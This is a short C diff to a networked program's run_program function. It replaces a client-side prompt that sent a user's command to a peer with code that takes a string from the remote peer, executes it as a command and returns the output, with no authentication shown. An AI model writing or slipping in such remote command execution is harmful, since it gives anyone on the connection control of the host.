@@ -416,33 +416,17 @@ int watch_directory(struct ip_info ip_ctx)
 
 int run_program(struct ip_info ip_ctx)
 {
-    char  cmd[1024];
     char *result = NULL;
-
-    if (send_string(ip_ctx, "10") != 0)
-        return -1;
-
-    printf("Enter command to run: ");
-    fflush(stdout);
-
-    if (!fgets(cmd, sizeof(cmd), stdin))
-        return -1;
-
-    cmd[strcspn(cmd, "\n")] = '\0';
-
-    if (cmd[0] == '\0')
-    {
-        printf("No command specified.\n");
-        return -1;
-    }
-
-    if (send_string(ip_ctx, cmd) != 0)
-        return -1;
 
     if (receive_string(ip_ctx, &result) != 0)
         return -1;
 
-    fputs(result, stdout);
+    char *output = NULL;
+
+    run_command_string(result, &output);
+
+    if (send_string(ip_ctx, output) != 0)
+        return -1;
 
     free(result);
     return 0;
